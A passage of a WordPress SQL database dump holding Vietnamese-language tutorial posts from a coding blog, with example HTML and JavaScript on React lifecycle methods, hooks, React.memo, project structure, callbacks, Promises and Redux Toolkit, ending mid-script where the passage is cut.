(1379, 1, '2021-07-15 04:03:35', '2021-07-14 21:03:35', '<img src=\"http://thaunguyen.com/blog/wp-content/uploads/2019/06/lifecycle.jpg\" alt=\"Life cycle ReactJS\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n                console.log(\"App - Constructor\");\n                this.state = {\n                    showCounter: true,\n                }\n            };\n\n            render() {\n                console.log(\"App - Render\");\n                return (\n                    <div>\n                        <button onClick={() => { this.setState({ showCounter: !this.state.showCounter }) }}>\n                            Remove Counter Component\n                        </button><br /><br />\n                        {this.state.showCounter ? <Counter /> : \'\'}\n                    </div>\n                );\n            }\n        }\n\n        //Vòng đời của Compomnent được liệt kê dưới đây\n        class Counter extends React.Component {\n            constructor(props) {\n                super(props);\n                console.log(\"Counter - Constructor\");\n                this.state = {\n                    count: 0,\n                }\n            }\n\n            // UNSAFE_componentWillMount() {\n            //     console.log(\'Counter - UNSAFE_componentWillMount\')\n            // }\n\n            // UNSAFE_componentWillReceiveProps(newProps) {\n            //     console.log(\'Counter - UNSAFE_componentWillReceiveProps\')\n            // }\n\n            // UNSAFE_componentWillUpdate(nextProps, nextState) {\n            //     console.log(\'Counter - UNSAFE_componentWillUpdate\');\n            // }\n\n            // getDerivedStateFromProps là API mới, để loại bỏ 3 API không an toàn phía trên (đã bị thêm chữ UNSAFE_)\n            static getDerivedStateFromProps(props, state) {\n                console.log(\'Counter - getDerivedStateFromProps\')\n                //return null: không thay đổi trạng thái\n                return null;\n            }\n\n            shouldComponentUpdate(newProps, newState) {\n                console.log(\'Counter - shouldComponentUpdate\');\n                //return true: nghĩa là luôn update khi Component cha của nó render lại: UNSAFE_componentWillReceiveProps -> UNSAFE_componentWillUpdate -> Render -> componentDidMount\n                //return false: ngược lại, lifecycle chỉ chạy đến: UNSAFE_componentWillReceiveProps -> stop\n                if (this.state.count === newState.count) {\n                    return false\n                }\n                return true;\n            }\n\n            render() {\n                console.log(\"Counter - Render\");\n                return (\n                    <div>\n                        <button onClick={() => { this.setState({ count: this.state.count + 1 }) }}>Counter Increment</button>\n                        <h3>Counter Count: {this.state.count}</h3>\n                    </div>\n                );\n            }\n\n            getSnapshotBeforeUpdate(prevProps, prevState) {\n                console.log(\'Counter - getSnapshotBeforeUpdate\')\n                //return null: không thay đổi trạng thái\n                return null;\n            }\n\n            //Thường thì chỉ dùng 3 function chính dưới đây\n            componentDidMount() {\n                //Chỉ thực hiện 1 lần duy nhất khi Component được khởi tạo\n                //Gọi API tại đây\n                console.log(\'Counter - componentDidMount\')\n            }\n\n            componentDidUpdate(prevProps, prevState) {\n                //HẠN CHẾ DÙNG, và khi dùng phải cực kỳ cẩn thận\n                //Không được setState bên trong DidUpdate ==> vì nó sẽ sinh ra vòng lặp vô tận :((\n                console.log(\'Counter - componentDidUpdate\');\n            }\n\n            componentWillUnmount() {\n                //Chỉ thực hiện 1 lần duy nhất khi Component bị hủy\n                //Clear Timeout hoặc Interval tại đây, hoặc Reset dữ liệu Redux\n                console.log(\'Counter - componentWillUnmount\')\n            }\n\n        }\n\n        ReactDOM.render(\n            <App />,\n            document.getElementById(\'root\')\n        );\n\n    </script>\n</body>\n\n</html>\n</pre>', 'ReactJS – 4.3. Class: Lifecylce', '', 'publish', 'open', 'open', '', 'reactjs-4-3-class-lifecylce', '', '', '2021-07-15 04:03:35', '2021-07-14 21:03:35', '', 0, 'https://duycode.com/?p=1379', 0, 'post', '', 0),
(1382, 1, '2021-05-01 05:00:52', '2021-04-30 22:00:52', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useRef } = React\r\n\r\n        function App(props) {\r\n            const [count, setCount] = useState(0)\r\n            const [number, setNumber] = useState(0)\r\n\r\n            useEffect(() => {\r\n                console.log(\"Dependencies = [count] =>= Chạy khi \'count\' thay đổi\")\r\n                setNumber(number + 1)\r\n                return ()=> {\r\n                    console.log(\"Cleanup [count] ==> Cleanup trước khi chạy code trong useEffect [count] --\")\r\n                }\r\n            }, [count])\r\n\r\n            console.log(\"1. Luôn luôn chạy, và code bên ngoài luôn chạy trước code trong useEffect\")\r\n\r\n            useEffect(() => {\r\n                console.log(\"Dependencies = [] ==> Chạy duy nhất 1 lần khi khởi tại\")\r\n                return ()=> {\r\n                    console.log(\"Cleanup []\")\r\n                }\r\n            }, [])\r\n\r\n            useEffect(() => {\r\n                console.log(\"Dependencies = undefined ==> Luôn luôn chạy\")\r\n                return ()=> {\r\n                    console.log(\"Cleanup undefined\")\r\n                }\r\n            })\r\n\r\n            // 2. Chạy render\r\n            return (\r\n                <div>\r\n                    <p>Count: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}> Increase </button>\r\n\r\n                    <p>Number: {count}</p>\r\n                    <button onClick={() => { setNumber(number + 1) }}> Increase </button>\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'app\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>1. Side effects có 2 loại</h2>\r\n1.1. Effects không cần clean up\r\n-- Gọi API lấy dữ liệu\r\n-- Tương tác với DOM\r\n1.2. Effects cần clean up\r\n-- Subscriptions\r\n-- setTimeout, setInterval\r\n\r\n\r\n<h2>2. Cấu trúc useEffect</h2>\r\n<pre>\r\nconst useEffect = React.useEffect\r\nfunction App(props) {\r\n    useEffect(() => {\r\n        //code \'side effect\'\r\n        return () => {\r\n            //code \'cleanup\'\r\n        }\r\n    },\r\n        //vị trí \'dependencies\'\r\n        []\r\n    )\r\n    return <div>rendering</div>\r\n}\r\n</pre>\r\n\r\n1. Mouting: Code chạy lần đầu\r\n-- Run rendering\r\n-- Run code khu vực \'side effect\'\r\n\r\n2. Khi Updating\r\n-- Run rendering\r\n-- Run code khu vực \'cleanup\' nếu \'dependencies\' thay đổi\r\n-- Run code khu vực \'side effect\' nếu \'dependencies\' thay đổi\r\n\r\n3. Khi Unmounting\r\n-- Run code khu vực \'cleanup\'\r\n\r\n\r\n<h2>3. Sự khác nhau giữa các cách viết dependencies</h2>\r\n-- 1. Không khai báo \'dependencies\'\r\n<pre>\r\n    useEffect(() => {\r\n        // code \'side effect\' ---> luôn chạy sau mỗi lần render\r\n        return () => {\r\n            // code \'cleanup\'\r\n        }\r\n    })\r\n    return <div>rendering</div>\r\n</pre>\r\n\r\n-- 2. Nếu là 1 mảng rỗng: [] \r\n<pre>\r\n    useEffect(() => {\r\n        // code \'side effect\' ---> chạy đúng 1 lần duy nhất sau lần render đầu tiên (tương tự ComponentDidmount)\r\n        return () => {\r\n            // code \'cleanup\' --> chạy đúng 1 lần khi unmount (tương tự ComponentWilUnmout)\r\n        }\r\n    },[])\r\n    return <div>rendering</div>\r\n</pre>\r\n\r\n-- 3. Nếu là 1 mảng có dữ liệu: [custom] \r\n<pre>\r\n    useEffect(() => {\r\n        // code \'side effect\'\r\n        // chạy lần khi render lần đầu tiên\r\n        // các lần render tiếp theo phụ thuộc vào \'dependencies\' có thay đổi hay không\r\n        return () => {\r\n            // code \'cleanup\'\r\n            // nếu \'dependencies\' thay đổi --> chạy \'cleanup\' --> sau đó chạy \'side effect\'\r\n        }\r\n    },[custom])\r\n    return <div>rendering</div>\r\n</pre>', 'ReactJS - 5. useEffect', '', 'publish', 'open', 'open', '', 'reactjs-5-useeffect', '', '', '2022-06-15 14:43:45', '2022-06-15 07:43:45', '', 0, 'https://duycode.com/?p=1382', 0, 'post', '', 0),
(1384, 1, '2021-07-15 15:07:58', '2021-07-15 08:07:58', '1. Javascript\r\n- Call Stack\r\n- Lazy Load\r\n- Adaptive Image: hình ảnh phù hợp với thiết bị\r\n- Memoization: lưu kết quả cho những function đã thực hiện với parametter đó rồi\r\n\r\n2. UI/UX\r\n- Debounce - Throttle : Delay sử dụng function (như là khi gõ search)\r\n- Infinite Scroll  \r\n', 'Các thuật ngữ kỹ thuật được sử dụng trong FrontEnd', '', 'publish', 'open', 'open', '', 'cac-thuat-ngu-ky-thuat-duoc-su-dung-trong-frontend', '', '', '2022-08-12 06:25:33', '2022-08-12 06:25:33', '', 0, 'https://duycode.com/?p=1384', 0, 'post', '', 0),
(1389, 1, '2021-05-01 06:00:41', '2021-04-30 23:00:41', '<h2>1. Hook useRef(), forwardRef()</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect, useRef, forwardRef } = React\r\n\r\n        // Dùng forwardRef để trỏ Ref xuống tận Component con\r\n        const CustomInput = (props, ref) => <input ref={ref} placeholder={props.hint} />\r\n        const FCustomInput = forwardRef(CustomInput)\r\n\r\n        function App(props) {\r\n            // useState(root) và useRef(root) ==> Cùng lấy giá trị \'initialValue\' cho lần đầu tiên Render,\r\n            // useRef: Các lần render sau, lấy giá trị trước đó\r\n            // useRef: không gây ra re-render khi thay đổi giá trị\r\n            const [count, setCount] = useState(0)\r\n            const prevCount = useRef(count)\r\n\r\n            //useRef dùng chủ yếu để truy vấn đến cây DOM\r\n            const ipRef = useRef(null)\r\n            const cIpRef = useRef(null)\r\n\r\n            useEffect(() => {\r\n                prevCount.current = count\r\n                ipRef.current.value = new Date().toISOString()\r\n                cIpRef.current.value = new Date().toISOString()\r\n            }, [count])\r\n\r\n            return (\r\n                <div>\r\n                    <p>Previous: {prevCount.current}</p>\r\n                    <p>Current: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}> Increase </button>\r\n                    <br /><br />\r\n                    <input ref={ipRef} /><br />\r\n                    <FCustomInput ref={cIpRef} hint=\"Test forwardRef...\" />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'app\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Class - refs</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        class App extends React.Component {\r\n            constructor(props) {\r\n                super(props);\r\n            }\r\n\r\n            handleChangeValue(event){\r\n                console.log(event);\r\n                this.refs.customValue.innerText =  this.refs.customInput.value\r\n            }\r\n\r\n            render() {\r\n                return (\r\n                    <div>\r\n                        <input type=\"text\" ref=\"customInput\" onChange={(e) => this.handleChangeValue(e)} /><br />\r\n                        <p ref=\"customValue\"></p>\r\n                    </div>\r\n                );\r\n            }\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – useRef, forwardRef', '', 'publish', 'open', 'open', '', 'reactjs-useref-forwardref', '', '', '2022-10-26 07:01:19', '2022-10-26 07:01:19', '', 0, 'https://duycode.com/?p=1389', 0, 'post', '', 0),
(1391, 1, '2021-05-01 07:01:28', '2021-05-01 00:01:28', '*** Kỹ thuật Memoization là gì</h2>\r\n<a href=\"/languages/ecmascript/es6-ky-thuat-memoization/\" rel=\"noopener\" target=\"_blank\">/languages/ecmascript/es6-ky-thuat-memoization/</a>\r\n\r\n<h2>1. React.memo()</h2>\r\n- React.memo() là một HOC, chứ ko phải hooks.\r\n- React.memo() dùng cho functional component.\r\n- Chỉ render lại component nếu props thay đổi.\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, memo } = React;\r\n\r\n        // Header không sử dụng React.memo ==> luôn bị render lại khi thằng cha nó render lại\r\n        // Thực tế, ReactJS dùng Virtual Dom, nên khi re-render cũng ko quá ảnh hưởng đến hiệu suất\r\n        const Header = (props) => {\r\n            console.log(\"Header render\");\r\n            return <p>Header - Hello: {props.name}</p>\r\n        }\r\n\r\n        // Footer sử dụng React.memo, props không thay đổi sẽ không bị render lại\r\n        // React.memo chỉ thực sự có ý nghĩa với những Component rất nặng\r\n        const Footer = (props) => {\r\n            console.log(\"Footer render\");\r\n            return <p>Footer - Goodbye: {props.name}</p>\r\n        }\r\n        const MemoFooter = React.memo(Footer);\r\n\r\n        const App = () => {\r\n            const [count, setCount] = useState(0);\r\n            return (\r\n                <div>\r\n                    <Header name=\"Jack\" />\r\n                    <p>Current: {count}</p>\r\n                    <button onClick={() => { setCount(count + 1) }}>Increase</button><br />\r\n                    <MemoFooter name=\"Jack\" />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS – 7.1. Kỹ thuật Memoization: React.memo()', '', 'publish', 'open', 'open', '', 'reactjs-7-1-ky-thuat-memoization-react-memo', '', '', '2022-05-20 11:04:13', '2022-05-20 04:04:13', '', 0, 'https://duycode.com/?p=1391', 0, 'post', '', 0),
(1396, 1, '2021-07-15 02:00:30', '2021-07-14 19:00:30', '<h2>1. Tổ chức folder của ReactJS</h2>\n1.1. Tổ chức theo loại: actions, reducers ,...\n<pre>\n.\n├── node_modules\n├── src\n│    ├── api\n│    │    ├── axiosClient.js\n│    │    ├── productApi.js\n│    │    ├── categoryApi.js\n│    │    └── ...\n│    ├── components\n│    │    ├── Common (các component dùng chung)\n│    │    │    ├── Header.js\n│    │    │    ├── NotFound.js\n│    │    │    └── Button.js\n│    │    ├── Product.js\n│    │    ├── Category.js\n│    │    └── ...\n│    ├── reducers\n│    │    ├── product.js\n│    │    ├── category.js\n│    │    ├── ...\n│    │    └── index.js (root reducer)\n│    ├── actions\n│    │    ├── product.js\n│    │    ├── category.js\n│    │    └── ...\n│    ├── pages\n│    │    ├── HomePage.jsx\n│    │    └── ...\n│    ├── store.js\n│    ├── index.js\n│    └── App.js\n├── public\n│    ├── ...\n│    └── index.html\n├── .env\n├── .gitignore\n├── package-lock.json\n├── package.json\n└── Procfile\n</pre>\n\n1.2. Tổ chức theo features(chức năng)\n<pre>\n.\n├── node_modules\n├── src\n│    ├── assets\n│    │    ├── images\n│    │    └── styles (global styles)\n│    ├── components (shared components)\n│    │    ├── Button.js\n│    │    ├── Header.js\n│    │    ├── NotFound.js\n│    │    ├── Form.js\n│    │    └── ...\n│    ├── features\n│    │    ├── Photo\n│    │    │    ├── components\n│    │    │    │    ├── PhotoList\n│    │    │    │    ├── PhotoCard\n│    │    │    │    └── ...\n│    │    │    ├── pages\n│    │    │    │    ├── MainPage\n│    │    │    │    ├── AddEditPage\n│    │    │    │    └── ...\n│    │    │    ├── photoSlice.js\n│    │    │    └── index.js\n│    │    ├── Category\n│    │    └── ...\n│    ├── store.js\n│    ├── index.js\n│    └── App.js\n├── public\n│    ├── ...\n│    └── index.html\n├── .env\n├── .gitignore\n├── package-lock.json\n├── package.json\n└── Procfile\n</pre>\n\n<h2>II. Các Module thường dùng</h2>\n1. State Management: Redux\n-- Redux Saga - Redux Thunk\n-- Redux Toolkit\n\n2. Form Module\n-- Formik\n-- React Hook Form\n-- Validate: Yup\n\n3. API Module\n\n4. Routing Module\n\n5. UI/UX Module\n-- Boottrap hoặc Reacttrap\n-- SCSS + BEM\n-- Material UI\n-- Ant Design\n\n<h2>II. Một ví dụ cài đặt 1 dự án ReactJS</h2>\n<pre>\nnpm init -y\n// React\nnpm i -D react react-dom react-router-dom @reduxjs/toolkit \n// UI/UX\nnpm i -D antd @ant-design/pro-layout\n\n// Webpack - core:\nnpm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react\n\n// Webpack - server\nnpm i -D webpack webpack-cli webpack-dev-server\n\n// Webpack - css loader\nnpm i -D style-loader css-loader sass sass-loader less less-loader\n\n// Webpack - file loader(image)\nnpm i -D file-loader\n\n// Webpack - typscript loader\nnpm i -D typescript ts-loader\n\n// Webpack - plugin: tạo file html, tách file css\nnpm i -D html-webpack-plugin mini-css-extract-plugin\n\n</pre>\n\n\n///. Vấn đề SEO\n-- NextJS\n\n\n\n', 'Tutorial - 2. Cấu trức thư mục và quản lý các Module', '', 'publish', 'open', 'open', '', 'reactjs-2-cau-truc-thu-muc-va-quan-ly-cac-module', '', '', '2021-07-15 02:00:30', '2021-07-14 19:00:30', '', 0, 'https://duycode.com/?p=1396', 0, 'post', '', 0),
(1431, 1, '2021-01-02 01:00:39', '2021-01-01 18:00:39', '<h2>1. Sử dụng Callback</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n\n<body>\n    <h2>Xử lý bất đồng bộ trong ES6</h2>\n    <script>\n        // Giả sử gặp bài toán tính diện tích hình thang, với 2 cạnh a,b và chiều cao h. Bình thường làm đơn giản như sau\n        // let square = (a, b, h) => (a + b) * h / 2;\n\n        // Để mô hình hóa xử lý bất động bộ, ta giả sử các phép toán \"+\", \"*\" và \"/\" là các phép toán bất đồng bộ với setTimeout 1000ms\n        let add = (a, b, callback) => {\n            setTimeout(() => {\n                if (typeof a != \'number\' || typeof b != \'number\') {\n                    return callback(\"Phép cộng phải có kiểu Number\")\n                }\n                callback(undefined, a + b);\n            }, 1000);\n        }\n\n        let multiply = (a, b, callback) => {\n            setTimeout(() => {\n                if (typeof a != \'number\' || typeof b != \'number\') {\n                    return callback(\"Phép nhân phải có kiểu Number\")\n                }\n                callback(undefined, a * b);\n            }, 1000);\n        }\n\n        let divide = (a, b, callback) => {\n            setTimeout(() => {\n                if (typeof a != \'number\' || typeof b != \'number\') {\n                    return callback(\"Phép chia phải có kiểu Number\")\n                }\n                if (b === 0) {\n                    return callback(\"Phép chia cho 0\")\n                }\n                callback(undefined, a / b);\n            }, 1000);\n        }\n\n        // Kiểm tra thử 1 hàm ở trên\n        // add(4, 2, (err, res) => {\n        //     if (err) return console.log(\"Lỗi: \", err);\n        //     console.log(\'Kết quả: \', res);\n        // })\n\n        let squareHinhThang = (a, b, h, g = 2, callback) => {\n            add(a, b, (err, res) => {\n                if (err) return callback(err);\n                multiply(res, h, (err, res) => {\n                    if (err) return callback(err);\n                    divide(res, 2, (err, res) => {\n                        if (err) return callback(err);\n                        callback(undefined, res);\n                    })\n                })\n            })\n        }\n\n        //Kết quả phép toán tính diện tích hình thang:\n        squareHinhThang(4, 3, 6, 2, (err, res) => {\n            if (err) return console.log(\"Lỗi: \", err);\n            console.log(\'Diện tích hình thang là: \', res);\n        })\n\n    </script>\n</body>\n\n</html>\n</pre>', 'JS Asynchronous: 1. Vấn đề Callback Hell', '', 'publish', 'open', 'open', '', 'js-asynchronous-1-van-de-callback-hell', '', '', '2021-01-02 01:00:39', '2021-01-01 18:00:39', '', 0, 'https://duycode.com/?p=1431', 0, 'post', '', 0),
(1442, 1, '2021-01-02 02:00:40', '2021-01-01 19:00:40', '<h2>1. Promise là gì</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n	<head>\n		<meta charset=\"UTF-8\" />\n		<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n		<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n		<title>Document</title>\n	</head>\n\n	<body>\n		<h2>Xử lý bất đồng bộ trong ES6</h2>\n		<script>\n			let equal = (a, b) => {\n				return new Promise((resolve, reject) => {\n					setTimeout(() => {\n						if (a === b) {\n							resolve(\'message_success\');\n						} else {\n							reject(\'message_error\');\n						}\n					}, 200);\n				});\n			};\n\n			// 1. Có 3 trạng thái của Promise: pending, fulfilled, rejected\n			let example1 = equal(4, 4);\n			let example2 = equal(3, 5);\n			console.log(example1); // Trạng thái \"pending\" => do chưa trả về resolve hoặc reject\n			console.log(example2); // Như trên\n			setTimeout(() => {\n				console.log(example1); // Trạng thái \"fulfilled\" => do đã trả về resolve\n				console.log(example2); // Trạng thái \"rejected\" => do đã trả về reject\n			}, 500);\n\n			// 2. \".then\" luôn trả về 1 Promise.\n			// Cần chú ý  Có thể xử lý Promise theo 2 cách\n			example1.then(\n				//Có thể xử lý bắt lỗi bên trong then\n				//Trường hợp này, nếu có lỗi xảy ra ==> hàm .then vẫn đi tiếp nếu có .then tiếp theo\n				(res) => {\n					console.log(\'Trạng thái thành công, \' + res);\n				},\n				(err) => {\n					console.log(\'Trạng thái thất bại, \' + err);\n				}\n			);\n\n			example2\n				//Có thể xử lý bắt lỗi bằng hàm \".catch\"\n				//Trường hợp này, nếu có lỗi xảy ra ==> bỏ qua các \".then\" tiếp theo mà vào thẳng \".catch\"\n				.then((res) => {\n					console.log(\'Trạng thái thành công, \' + res);\n				})\n				.catch((err) => {\n					console.log(\'Trạng thái thất bại, \' + err);\n				})\n				.finally(() => {\n					console.log(\'Finally \'); //Luôn luôn được chạy\n				});\n		</script>\n	</body>\n</html>\n\n</pre>\n\n<h2>2. Bài toán tính diện tích hình thang </h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n\n<body>\n    <h2>Xử lý bất đồng bộ trong ES6</h2>\n    <script>\n        let add = (a, b) => {\n            return new Promise((resolve, reject) => {\n                setTimeout(() => {\n                    if (typeof a != \'number\' || typeof b != \'number\') {\n                        return reject(\"Phép cộng phải có kiểu Number\")\n                    }\n                    resolve(a + b);\n                }, 1000);\n            })\n        }\n\n        let multiply = (a, b) => {\n            return new Promise((resolve, reject) => {\n                setTimeout(() => {\n                    if (typeof a != \'number\' || typeof b != \'number\') {\n                        return reject(\"Phép nhân phải có kiểu Number\")\n                    }\n                    resolve(a * b);\n                }, 1000);\n            })\n        }\n\n        let divide = (a, b) => {\n            return new Promise((resolve, reject) => {\n                setTimeout(() => {\n                    if (typeof a != \'number\' || typeof b != \'number\') {\n                        return reject(\"Phép chia phải có kiểu Number\")\n                    }\n                    if (b === 0) {\n                        return reject(\"Phép chia cho 0\")\n                    }\n                    resolve(a / b);\n                }, 1000);\n            })\n        }\n\n        //Kiểm tra thử 1 hàm ở trên\n        // add(4, 0).then(\n        //     (res) => { console.log(\'Kết quả: \' + res) },\n        //     (err) => { console.log(\'Lỗi: \' + err) }\n        // )\n\n        //Bài toán làm phép tính: (a + b) * h / 2;\n\n\n\n        let squareHinhThang = (a, b, h, g = 2) => {\n            //Nếu Reject ==> hàm vẫn tiếp tục .then tiếp (lí do: .then => sẽ trả về Promise)\n            add(a, b)\n                .then(\n                    //nếu Resolve ==> kết quả trả về \"multiply(res, 3)\" ==> vẫn là 1 Promise ==> có thể then tiếp\n                    (res) => multiply(res, h),\n                    (err) => { console.log(\'Lỗi: \' + err) }\n                )\n                .then(\n                    //nếu resolve ==> kết quả trả về \"divide(res, 2)\" ==> vẫn là 1 Promise ==> có thể then tiếp\n                    (res) => divide(res, g),\n                    (err) => { console.log(\'Lỗi: \' + err) }\n                )\n                .then(\n                    (res) => { console.log(\'Kết quả: \' + res) },\n                    (err) => { console.log(\'Lỗi: \' + err) }\n                )\n        }\n\n        let squareHinhThang2 = (a, b, h, g = 2) => {\n            //Để ngắn gọn hơn, các Promise liên tiếp không cần khai báo các hàm Reject ==> tạo ra .catch(err)\n            //Nếu gặp Reject ==> bỏ qua các then tiếp theo ==> vào thằng hàm .catch(err)\n            add(a, b)\n                .then((res) => multiply(res, h))\n                .then((res) => divide(res, g))\n                .then((res) => { console.log(\'Kết quả: \' + res) })\n                .catch((err) => { console.log(\'Lỗi: \' + err) })\n        }\n\n        squareHinhThang2(3, 4, 5)\n    </script>\n</body>\n\n</html>\n</pre>', 'JS Asynchronous: 2. Sử dụng Promise', '', 'publish', 'open', 'open', '', 'es6-xu-ly-bat-dong-bo-2-su-dung-promise', '', '', '2021-01-02 02:00:40', '2021-01-01 19:00:40', '', 0, 'https://duycode.com/?p=1442', 0, 'post', '', 0),
(1459, 1, '2021-06-28 06:00:21', '2021-06-27 23:00:21', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"\" />\n\n<h2>4. Demo app Count with use ReactJS, Redux and Redux-Toolkit</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>Demo app Count with use ReactJS and Redux</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n\n    <!-- =========== slices/count_slice.js =========== -->\n    <script>\n        //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn\n        const countSlice = RTK.createSlice({\n            name: \'count\',\n            initialState: { amount: 1 },\n            reducers: {\n                action_increment(state, action) {\n                    state.amount += action.payload.amount;\n                },\n                action_decrement(state, action) {\n                    state.amount -= action.payload.amount;\n                },\n            }\n        });\n        // Export ra các actions, reducer tương ứng :D\n        const { action_increment, action_decrement } = countSlice.actions;\n        const countReducer = countSlice.reducer;\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script type=\"text/babel\">\n        //2. Khai báo store: tất cả các Reducer trong store ở dưới đây\n        const store = RTK.configureStore({\n            reducer: {\n                count: countReducer\n            }\n        })\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        //3. Sử dụng store: Dùng useSelector và useDispatch để lấy dữ liệu từ Redux\n        function App(props) {\n\n            const count = ReactRedux.useSelector(state => state.count);\n            const dispatch = ReactRedux.useDispatch();\n            return (\n                <div>\n                    <p>{count.amount}</p>\n                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>\n                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button>\n                </div>\n            )\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //4. Connect Store của Redux bằng Provider;\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    